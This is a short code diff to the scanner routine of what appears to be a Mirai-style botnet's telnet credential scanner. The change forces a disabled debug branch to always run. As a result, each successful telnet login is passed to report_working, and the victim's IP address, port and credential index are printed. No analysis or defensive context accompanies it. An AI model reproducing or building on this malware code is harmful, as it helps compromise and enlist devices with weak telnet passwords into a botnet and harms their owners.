@@ -488,9 +488,10 @@ void scanner_init(void)
                                 printf("[scanner] FD%d finished telnet negotiation\n", conn->fd);
 #endif
 #ifdef DEBUG
-                                if (0==1)
+                                if (1==1)
                                 {
                                     report_working(conn->dst_addr, conn->dst_port, conn->auth);
+                                    printf("[scanner] FD%d addr: %d.%d.%d.%d, port: %d, auth: %x\n", conn->fd, conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff, conn->dst_port, conn->auth);
                                     close(conn->fd);
                                     conn->fd = -1;
                                     conn->state = SC_CLOSED;
